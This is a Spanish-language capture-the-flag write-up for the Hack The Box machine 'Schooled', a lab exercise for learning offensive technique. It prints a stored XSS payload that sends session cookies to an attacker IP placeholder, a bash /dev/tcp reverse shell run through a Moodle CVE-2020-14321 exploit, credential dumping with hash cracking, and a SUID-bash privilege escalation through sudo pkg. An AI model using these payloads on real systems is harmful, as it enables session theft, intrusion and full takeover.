---
layout: single
title: Schooled - Hack The Box
excerpt: "En esta máquina de dificultad media de **HTB**, encontramos un subdominio moodle en una web haciendo **fuzzing**, para luego crear un usuario, efectuar un **cookie hijacking**, aprovecharnos de un exploit de github para conseguir **RCE** por medio de un **CVE** de moodle, una vez dentro, encontramos un archivo con credenciales validas para conectarnos por **mysql**, vemos un usuario administrador con el hash de su contraseña, lo crackeamos con **john**, nos conectamos por ssh y nos aprovechamos de un permiso que tenemos para ejecutar **pkg** como **root**, para finalmente escalar privilegios"
date: 2021-09-15
classes: wide
header:
  teaser: /assets/images/htb-writeup-schooled/Schooled.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - cve
  - writeup
tags:
  - freebsd
  - web
  - fuzzing
  - moodle
  - CVE-2020-14321
  - mysql
  - pkg
  - fpm
  - gtfobins
---

<p align="center">
<img src="/assets/images/htb-writeup-schooled/img_header.png">
</p>

Como siempre empezamos con la faze de reconocimiento, haciendo un escaneo de puertos con **nmap**

```bash
~$> sudo nmap -p- -sS --min-rate 4000 --open -vvv -n -Pn 10.10.10.234
```
 - ```-p-``` -> Todo el rango de puertos (1-65535)
 - ```-sS``` -> TCP SYN/PORT scan
 - ```--min-rate``` -> Mínimo de paquetes que quiero que se emitan por segundo (4000)
 - ```--open``` -> Mostrar solo puertos abiertos
 - ```-vvv``` -> Triple verbose para ver los avances del escaneo antes de que acabe
 - ```-n``` -> Quitar la resolución DNS
 - ```-Pn``` -> Para no aplicar host discovery

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-15 16:08 -05
Initiating SYN Stealth Scan at 16:08
Scanning 10.10.10.234 [65535 ports]
Discovered open port 22/tcp on 10.10.10.234
Discovered open port 80/tcp on 10.10.10.234
Nmap scan report for 10.10.10.234
Not shown: 58807 filtered ports, 6726 closed ports
Reason: 58807 no-responses and 6726 resets
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 35.59 seconds
           Raw packets sent: 128525 (5.655MB) | Rcvd: 6846 (274.068KB)
```
Con esto vemos que hay 2 puertos externamente visibles:

  - ```80``` -> http
  - ```22``` -> ssh

Sabiendo que hay un servicio web **http** corriendo, hagamos un reconocimiento desde el navegador

<p align="center">
<img src="/assets/images/htb-writeup-schooled/img1.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-schooled/img2.png">
</p>

Al final de esta página vemos que se repite un dominio **schooled.htb**

<p align="center">
<img src="/assets/images/htb-writeup-schooled/img3.png">
</p>

Así que lo añadimos a el ```/etc/hosts```, ya que nos puede servir para más adelante

```bash
~$> sudo echo "10.10.10.234	schooled.htb" >> /etc/hosts
```

Despues de un rato buscando y haciendo **fuzzing de directorios**, podemos encontrar nombres de **usuarios potenciales**, pero a demas de esto, no vemos mucho más, por lo que decidí nuevamente aplicar **fuzzing**, pero esta vez en busca de **subdominios** usando **wfuzz** de la siguiente forma:

```bash
~$> wfuzz -c -t 100 --hl=461 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host: FUZZ.schooled.htb" http://10.10.10.234
```

  - ```-c``` -> Formato **colorizado**
  - ```-t``` -> Usando los hilos especificados (**100**)
  - ```--hl``` -> **Ocultando** las respuestas con el número de lineas **461**
  - ```--hc``` -> **Ocultando** las respuestas con el **código** de estado **404**
  - ```-w``` -> Wordlist
  - ```-H``` -> Especificar host
  - ```FUZZ``` -> Lugar donde se aplicara el **fuzzing**

Obteniendo esto:

```bash
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.234/
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                   
=====================================================================

000002010:   400        10 L     45 W       347 Ch      "'"                                                       
000003776:   400        10 L     45 W       347 Ch      "%20"                                                     
000005288:   400        10 L     45 W       347 Ch      "$FILE"                                                   
000005940:   400        10 L     45 W       347 Ch      "$file"                                                   
000006990:   400        10 L     45 W       347 Ch      "*checkout*"                                              
000014419:   200        1 L      5 W        84 Ch       "moodle" **<- ESTO NOS INTERESA**
```

Con esto encontramos algo bastante interesante, un **moodle**, lo añadimos al ```/etc/hosts```, justo al lado del que añadimos al principio, quedando así en el ```/etc/hosts```:

```bash
10.10.10.234	schooled.htb moodle.schooled.htb
```
Luego de esto, intentamos visualizalo en la web, y vemos el moodle

<p align="center">
<img src="/assets/images/htb-writeup-schooled/img4.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-schooled/img5.png">
</p>

Entramos al panel de login, para crear un nuevo usuario

<p align="center">
<img src="/assets/images/htb-writeup-schooled/img6.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-schooled/img7.png">
</p>

En el correo debemos especificar el dominio (**student.schooled.htb**) que nos indican en el siguiente error:

<p align="center">
<img src="/assets/images/htb-writeup-schooled/img8.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-schooled/img9.png">
</p>

Y creamos el nuevo usuario

<p align="center">
<img src="/assets/images/htb-writeup-schooled/img10.png">
</p>

Confirmamos la cuenta

<p align="center">
<img src="/assets/images/htb-writeup-schooled/img11.png">
</p>

Entramos y continuamos

<p align="center">
<img src="/assets/images/htb-writeup-schooled/img12.png">
</p>

Nos dirigimos a **Site home**

<p align="center">
<img src="/assets/images/htb-writeup-schooled/img13.png">
</p>

Entramos en **Mathematics**

<p align="center">
<img src="/assets/images/htb-writeup-schooled/img14.png">
</p>

Y nos inscribimos

<p align="center">
<img src="/assets/images/htb-writeup-schooled/img15.png">
</p>

Luego de esto, entramos en anuncios y vemos dos posts, en el último post, vemos que el usuario **Manuel Philips** dice algo sobre el **MoodleNet**

<p align="center">
<img src="/assets/images/htb-writeup-schooled/img16.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-schooled/img17.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-schooled/img18.png">
</p>

Al parecer estará revisando los perfiles de los usuarios inscritos en el curso, teniendo en cuenta esto, ya se nos biene a la cabeza un **cookie hijacking**, así que vamos a modificar nuestro **MoodleNet** así:

 - Vamos a profile

<p align="center">
<img src="/assets/images/htb-writeup-schooled/img19.png">
</p>

 - A editar perfil

<p align="center">
<img src="/assets/images/htb-writeup-schooled/img20.png">
</p>

 - Y aquí vemos el **MoodleNet profile** que se nos mensionaba anteriormente

<p align="center">
<img src="/assets/images/htb-writeup-schooled/img21.png">
</p>

Dentro de este vamos a ingresar el siguiente código malicioso que nos permitira robar la cookie de sesión del usuario **Manuel Philips**

```html
<script>document.write("<img src='http://[TU_IP]/imagen.jpg?cookie=" + document.cookie + "'>")</script>
```
<p align="center">
<img src="/assets/images/htb-writeup-schooled/img22.png">
</p>

Guardamos los cambios

<p align="center">
<img src="/assets/images/htb-writeup-schooled/img23.png">
</p>

Vemos que se añadió el **MoodleNet profile** en nuestro usuario

<p align="center">
<img src="/assets/images/htb-writeup-schooled/img24.png">
</p>

Iniciamos un servicio **http** con **python3** por el **puerto 80**

```bash
~$> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Y despues de esperar un rato, vemos que recibimos una petición **GET** con la cookie de sessión del usuario **Manuel Phillips**

```bash
10.10.10.234 - - [15/Sep/2021 21:42:02] code 404, message File not found
10.10.10.234 - - [15/Sep/2021 21:42:02] "GET /imagen.jpg?cookie=MoodleSession=e59bjq67scrid3id39ti344dmn HTTP/1.1" 404
```
Ahora podríamos conectarnos como **Manuel Phillips** haciendo un **cookie hijacking**, pero vamos directo al grano:

 - Clonamos el siguiente exploit del repositorio de githubd de [Lanzt](https://github.com/lanzt), con esto conseguiremos RCE

```bash
~$> git clone https://github.com/lanzt/CVE-2020-14321
```
```bash
Cloning into 'CVE-2020-14321'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (13/13), done.
remote: Total 18 (delta 3), reused 8 (delta 2), pack-reused 0
Receiving objects: 100% (18/18), 15.30 KiB | 979.00 KiB/s, done.
Resolving deltas: 100% (3/3), done.
```
 - Nos metemos al directorio donde se clonó, le damos premisos de ejecución

```bash
~$> cd CVE-2020-14321
~$> chmod +x CVE-2020-14321_RCE.py
```
 - Nos ponemos en escucha en una terminal por separado, por el **puerto 443**, haciendo uso de **rlwrap**

```bash
~$> rlwrap nc -nlvp 443
listening on [any] 443 ...
```

 - Y ejecutamos el exploit anteriormente clonado de este modo:

```bash
~$> ./CVE-2020-14321_RCE.py http://moodle.schooled.htb/moodle --cookie [COOKIE_ROBADA_DEL_USUARIO_PHILLIPS] -c "bash -c 'bash -i >& /dev/tcp/[TU_IP]/443 0>&1'"
```
```bash
 __     __     __   __  __   __              __  __
/  \  /|_  __   _) /  \  _) /  \ __  /| |__|  _)  _) /|
\__ \/ |__     /__ \__/ /__ \__/      |    | __) /__  | • by lanz

Moodle 3.9 - Remote Command Execution (Authenticated as teacher)
Course enrolments allowed privilege escalation from teacher role into manager role to RCE
                                                        
[+] Login on site: MoodleSession:sjcag2ogfe33bg1p1ri1l80au9 ✓ 
[+] Updating roles to move on manager accout: ✓     
[+] Updating rol manager to enable install plugins: ✓
[+] Uploading malicious .zip file: ✓
[+] Executing bash -c 'bash -i >& /dev/tcp/10.10.16.51/443 0>&1': ✓
[+] Keep breaking ev3rYthiNg!!
```
Luego de esto vemos como recibimos una conección en la consola por la que estabamos en escucha

```bash
connect to [10.10.16.51] from (UNKNOWN) [10.10.10.234] 23509
bash: cannot set terminal process group (2027): Can't assign requested address
bash: no job control in this shell
[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$
```
No podemos hacer un [tratamiento de la tty](https://invertebr4do.github.io/tratamiento-de-tty/), pero si podemos definir las variables **TERM** y **SHELL**, para mejorar un poco la movilidad

```bash
[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ export TERM=xterm
[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ export SHELL=bash
```
Retrocedemos unos directorios

```bash
[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ cd /usr/local/www/apache24/data/moodle
[www@Schooled /usr/local/www/apache24/data/moodle]$
```
Y si listamos el contenido de este directorio vemos varios ficheros, pero hay uno que puede contener información interesante, el ```config.php```

```bash
[www@Schooled /usr/local/www/apache24/data/moodle]$ ls
[...]
config-dist.php
config.php
contentbank
[...]
```
Lo leemos y encontramos credenciales en texto plano

```bash
[www@Schooled /usr/local/www/apache24/data/moodle]$ cat config.php
```
```bash
<?php  // Moodle configuration file

unset($CFG);
global $CFG;
$CFG = new stdClass();

$CFG->dbtype    = 'mysqli';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'moodle'; **<- USUARIO**
$CFG->dbpass    = 'PlaybookMaster2020'; **<- CONTRASEÑA**
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (
  'dbpersist' => 0,
  'dbport' => 3306,
  'dbsocket' => '',
  'dbcollation' => 'utf8_unicode_ci',
);

$CFG->wwwroot   = 'http://moodle.schooled.htb/moodle';
$CFG->dataroot  = '/usr/local/www/apache24/moodledata';
$CFG->admin     = 'admin';

$CFG->directorypermissions = 0777;

require_once(__DIR__ . '/lib/setup.php');

// There is no php closing tag in this file,
// it is intentional because it prevents trailing whitespace problems!
```
Si intentamos listar las bases de datos con mysqlshow o nos intentamos conectar con mysql, no vamos a poder ya que el **PATH** del usuario con el que estamos, es muy limitado, esto lo vemos haciendole un ```echo``` a la variable de entorno

```bash
[www@Schooled /usr/local/www/apache24/data/moodle]$ echo $PATH
/sbin:/bin:/usr/sbin:/usr/bin
```
Como podemos ver, con este **PATH** no podremos hacer mucho, por lo que abrimos una consola de nuestra máquina, de la misma manera leemos el **PATH**, no lo copiamos y lo definimos en la máquina víctima

```bash
~$> echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/$USER
```
```bash
[www@Schooled /usr/local/www/apache24/data/moodle]$ export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/$USER
```

Con esto ya podremos usar mysqlshow y mysql, ya que con lo anterior, el sistema tiene más rutas para buscar
 - Listamos las bases de datos usando las credenciales que anteriormente encontramos en el fichero ```config.php```

```bash
[www@Schooled /usr/local/www/apache24/data/moodle]$ mysqlshow -umoodle -pPlaybookMaster2020
```
```bash
+--------------------+
|     Databases      |
+--------------------+
| information_schema |
| moodle             |
+--------------------+
```
 - Vemos 2 bases de datos, si vemos el contenido de la segunda (**moodle**), se nos listan muchas tablas, pero vemos una potencialmente crítica (**mdl_user**)

```bash
[www@Schooled /usr/local/www/apache24/data/moodle]$ mysqlshow -umoodle -pPlaybookMaster2020 moodle
```
```bash
[ ...  ...  ...  ...  ]
| mdl_url             |
| mdl_user            |
| mdl_user_devices    |
[ ...  ...  ...  ...  ]
```
 - Vemos el contenido de esta tabla con mysql

```bash
[www@Schooled /usr/local/www/apache24/data/moodle]$ mysql -umoodle -pPlaybookMaster2020 -e "select * from mdl_user" moodle
```
 - Luego de esto, se nos lista un monton de contenido, nosotros nos quedaremos con la fila que dice **admin**

```bash
[ ...  ...  ...  ...  ]		[ ...  ...  ...  ...  ]
admin   $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW   Jamie   Borham  jamie@staff.schooled.htb
[ ...  ...  ...  ...  ]		[ ...  ...  ...  ...  ]
```
> Debemos recordar el nombre del usuario administrador (**Jamie**), este nos servirá más adelante

 - Copiamos el usuario (**admin**) con su hash (**$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW**) y lo guardamos en un fichero en nuestra máquina de atacante

```bash
~$> echo "admin:\$2y\$10\$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW" > hash
```
 - Ahora **crackeamos** el hash, en mi caso con **john**

```bash
~$> john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
```bash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!QAZ2wsx	(admin)
```
Luego de un rato conseguimos unas credenciales, una contraseña y un usuario el cual usaremos para conectarnos por ssh como el usuario (**jamie** <- usuario administrador)

> Esto podemos hacerlo desde la máquina víctima o desde nuestra máquina de atacante (yo prefiero conectarme desde mi máquina)

```bash
~$> ssh jamie@10.10.10.234
Password for jamie@Schooled: !QAZ2wsx
```
```bash
jamie@Schooled:~ $ whoami
jamie
```
Perfecto!, podemos conectarnos y leer la flag **user.txt**
```bash
jamie@Schooled:~ $ ls
user.txt
jamie@Schooled:~ $ cat user.txt
```
Ahora, para escalar privilegios, listamos las acciones que podemos hacer como el usuario **root**

```bash
jamie@Schooled:~ $ sudo -l
```
```bash
User jamie may run the following commands on Schooled:
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *
```
Y vemos que podemos ejecutar **pkg** como **root** sin proporcionar contraseña

Buscando un poco encontré [este post](https://gtfobins.github.io/gtfobins/pkg/#sudo) en el que se nos explica como abusar de **pkg** haciendo uso de **fpm**

> fpm es una gema que tendremos que instalar en nuestra máquina, esto con **gem install fpm**

Hacemos esto en nuestra máquina

```bash
~$> TF=$(mktemp -d)
~$> echo 'chmod 4755 /bin/bash' > $TF/x.sh
```
 - ```chmod 4755 /bin/bash``` -> Asignar permisos **SUID** a la bash

```bash
~$> fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
Created package {:path=>"x-1.0.txz"}
```
Nos ponemos en escucha en nuestra máquina, con **netcat** por el puerto **443**, para transferir el fichero que acabamos de crear (**x-1.0.txz**)

```bash
~$> nc -nlvp 443 < x-1.0.txz
listening on [any] 443 ...
```
Y nos conectamos desde la máquina víctima, igualmente con **netcat** por el puerto **443**, para recibir el fichero que habíamos creado (**x-1.0.txz**)

```bash
jamie@Schooled:~ $ nc [TU_IP] 443 > x-1.0.txz
```

Vemos que recibimos una conección a nuestra máquina y se descargó el fichero (**x-1.0.txz**) en la máquina víctima

```bash
jamie@Schooled:~ $ ls
user.txt        x-1.0.txz
```
Ejecutamos este comando en la máquina víctima:

```bash
jamie@Schooled:~ $ sudo /usr/sbin/pkg install -y --no-repo-update ./x-1.0.txz
```
```bash
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. 'pkg update' required
Checking integrity... done (0 conflicting)
The following 1 package(s) will be affected (of 0 checked):

New packages to be INSTALLED:
        x: 1.0

Number of packages to be installed: 1
[1/1] Installing x-1.0...
Extracting x-1.0:   0%
pkg: File //tmp/tmp.tEHHdxCGFv/x.sh not specified in the manifest
Extracting x-1.0: 100%
```
Leemos los permisos de la **bash**

```bash
jamie@Schooled:~ $ ls -l /usr/local/bin/bash
-rwsr-xr-x  1 root  wheel  941288 Feb 20  2021 /usr/local/bin/bash
```
Y vemos que tiene asignados permisos **SUID**, lo que nos permitirá ejecutar una bash como **root**, pudiendo así entrar en en directorio ```/root``` y visualizar la flag

```bash
jamie@Schooled:~ $ /usr/local/bin/bash -p
[jamie@Schooled ~]#
```
```bash
[jamie@Schooled ~]# whoami
root
```
```bash
[jamie@Schooled ~]# cd /root
[jamie@Schooled /root]# cat root.txt
```
